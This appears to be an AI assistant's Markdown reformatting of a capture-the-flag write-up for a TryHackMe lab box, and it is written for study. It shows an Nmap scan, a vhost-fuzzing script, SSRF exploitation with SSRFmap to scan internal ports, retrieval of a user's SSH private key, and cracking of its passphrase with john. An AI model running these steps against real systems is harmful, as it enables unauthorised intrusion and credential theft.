Here’s the beautifully formatted version of your provided text in Markdown (.md) format:

```md
# Nmap Scan Results

Let's first perform an Nmap scan:

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsXwQrUw2YlhqFRnJpLvzHz5VnTqQ/Xr+IMJmnIyh82p1WwUsnFHgAELVccD6DdB1ksKH5HxD8iBoY83p3d/UfM8xlPzWGZkTAfZ+SR1b6MJEJU/JEiooZu4aPe4tiRdNQKB09stTOfaMUFsbXSYGjvf5u+gavNZOOTCQxEoKeZzPzxUJ0baz/Vx5Elihfm3MoR0nrE2XFTY6HV2cwLojeWCww3njG+P1E4salm86MAswQWxOeHLk/a0wXJ343X5NaHNuF4Xo3PpqiUr+qEZUyZJKNrH4O8hErH/2h7AUEPpPIo7zEK1ZzqFNWcpOqguYOFVZMagHS//ASg3ikzouZS1nUmS7ehA9bGrhCbqMRSin1QJ/mnwYBylW6IsPyfuJfl9KFnbTITa56URmudd999UzNEj8Wx8Qj4LfTWKLubcYS9iKN+exbAxXOIdbpolVtIFh0mP/cm9WRhf0z9WR9tX1FvJYi013rcaMpy62pjPCO20nbNsnEG6QckMk/4RM=
|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOIFbjvSW+v5RoDWDKFI//sn2LxlSxk2ovUPyUzpB1g/XQLlbF1oy3To2D8N8LAWwrLForz4IJ4JrZXR5KvRK8Y=
|   256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFf4qwz85WzZVwohJm4pYByLpBj7j2JiQp4cBqmaBwYV
80/tcp open  http    syn-ack ttl 60 nginx 1.18.0 (Ubuntu)
|_http-title: Creative Studio | Free Bootstrap 4.3.x template
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports are open, let's check the web page first.

We performed directory fuzzing, a Nikto scan, and more but found nothing. This CTF contains a domain-based connection with the webpage, so let's try vhost fuzzing.

## Custom VHost Fuzzing Script

Since I forgot the syntax of `wfuzz`, here's my custom vhost fuzzing script:

```bash
#!/bin/bash

# Check if ffuf is installed
if ! command -v ffuf &> /dev/null
then
    echo "[!] ffuf could not be found. Please install it using 'sudo apt-get install ffuf'."
    exit 1
fi

# Check for required inputs
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <domain> <wordlist> <thread_count>"
    exit 1
fi

# Inputs
DOMAIN=$1
WORDLIST=$2
THREADS=$3

# Check if wordlist exists
if [ ! -f "$WORDLIST" ]; then
    echo "[!] Wordlist file $WORDLIST not found!"
    exit 1
fi

# Output file for valid subdomains
OUTPUT_FILE="valid_vhosts_$DOMAIN.txt"

# Clean previous output if exists
if [ -f "$OUTPUT_FILE" ]; then
    rm "$OUTPUT_FILE"
fi

# Enumerate vhosts using ffuf (fast fuzzing)
echo "[*] Starting vhost fuzzing on $DOMAIN with $THREADS threads..."

ffuf -w $WORDLIST:FUZZ -u "http://$DOMAIN" -H "Host: FUZZ.$DOMAIN" -t $THREADS -mc 200 -o $OUTPUT_FILE -of json

if [ $? -eq 0 ]; then
    echo "[*] Vhost fuzzing completed! Results saved in $OUTPUT_FILE"
else
    echo "[!] Fuzzing failed. Please check the inputs and network connectivity."
    exit 1
fi

# Parse the JSON output to display only the valid subdomains
echo "[*] Extracting valid vhosts from results..."
jq -r '.results[] | .input.Host' < $OUTPUT_FILE > extracted_vhosts.txt

echo "[*] Valid vhosts:"
cat extracted_vhosts.txt
```

After running this script, we found one vhost.

---

![Image](https://prod-files-secure.s3.us-west-2.amazonaws.com/233b5bad-d5f7-427b-9519-a185de520345/6160d764-1993-49b3-9366-33595a8c335c/image.png)

Let's visit the site. The file indicates that the site is up or not. If we run our `python3 -m http.server`, we get a response.

This means the server contains a severe **SSRF** vulnerability. Let's check all kinds of file inclusions.

We refer to the guide from [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery) for checking SSRF vulnerabilities.

At last, as suggested, we used SSRF internal port scanner tools from [SSRFmap](https://github.com/swisskyrepo/SSRFmap).

```bash
python3 ssrfmap.py -r request -p url -m portscan
```

This request file contains an intercepted request from `beta.creative.thm`.

We found two open ports: **80** and **1337**. Checking them led us to:

![Image](https://prod-files-secure.s3.us-west-2.amazonaws.com/233b5bad-d5f7-427b-9519-a185de520345/c3e08a66-183f-4a08-a902-963bc13a9d21/image.png)

We found local file listings, leading to the discovery of the SSH key from `saad/.ssh/id_rsa`:

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
<Private Key Content>
-----END OPENSSH PRIVATE KEY-----
```

The `id_rsa` has a passphrase. Let's decrypt it using:

```bash
┌──(pip_tools)─(unknownperson㉿unknownperson)-[~/CTF/THM/creative]
└─$ ssh2john id_rsa > hash         
                                                                                                                                                      
┌──(pip_tools)─(unknownperson㉿unknownperson)-[~/CTF/THM/creative]
└─$ john --wordlist=/usr/share/wordlist/rockyou.txt.crdownload hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetness        (id_rsa)     
1g 0:00:00:53 DONE (2024-10-05 16:24) 0.01861g/s 17.87p/s 17.87c/s 17.87C/s xbox...
```
```

This Markdown file is now in a clean, structured, and readable format.
